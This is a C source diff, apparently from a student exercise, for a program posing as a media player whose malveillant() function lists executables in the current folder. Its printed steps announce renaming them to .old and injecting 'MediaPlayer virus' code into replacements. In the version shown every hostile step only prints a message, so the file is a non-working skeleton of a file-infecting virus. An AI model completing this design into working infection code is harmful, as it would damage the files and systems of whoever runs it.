@@ -82,61 +82,38 @@ void mediaplayer () {
 /*
         Compte le nombre de fichiers executables dans le dossier à l'execution
 */
-const char * cptExec() {
+void cptExec() {
         DIR *myDir;
-        int cptExec = 0;
         struct dirent *dir;
 
         // FIRST PARSING
         myDir = opendir(".");
         if (myDir) {
                 while ((dir = readdir(myDir)) != NULL) {
-                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name))) {
+                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
+                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name))) {
                                 if (access(dir->d_name, X_OK) == 0) {
-                                        printf("%s is executable\n",dir->d_name);
-                                        cptExec++;
+                                        renamingFile(dir->d_name);
                                 }
                         }
                 }
                 closedir(myDir);
         }
+}
 
-        if (cptExec > 0) {
-                const char *execNames[cptExec];
-
-                myDir = opendir(".");
-                if (myDir) {
-                        int i = 0;
-                        while ((dir = readdir(myDir)) != NULL) {
-                                if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name))) {
-                                        if (access(dir->d_name, X_OK) == 0) {
-                                                execNames[i] = dir->d_name;
-                                        }
-                                }
-                        }
-                        closedir(myDir);
-                }
-                return *execNames;
-        }
-        return 0;
+void renamingFile(char *fileName) {
+        printf("Renaming %s into %s.old\n",fileName,fileName);
 }
 
 void malveillant() {
-        printf("Bad things happens bruh\n");
+        printf("\nBad things happens bruh\n");
         //system("cat MediaPlayer");
-        printf("Listing executables..\n\n");
-        const char * exname = cptExec();
+        printf("\nListing executables and renaming..\n\n");
 
-        for(int i=0; i < sizeof(exname)-1; i++) {
-                printf("\n%s\n",&exname[i]);
-        }
-        printf("\n%s\n",&exname[0]);
-        printf("\n%s\n",&exname[1]);
+        cptExec();
 
-
-        printf("Renaming all executables with xxx.old\n");
-        printf("Création of new executables with the same name as the previous ones..\n");
-        printf("Injection du code du virus MediaPlayer dans les nouveaux executables..\n");
+        printf("\nCréation of new executables with the same name as the previous ones..\n");
+        printf("\nInjection du code du virus MediaPlayer dans les nouveaux executables..\n");
 
 
 }
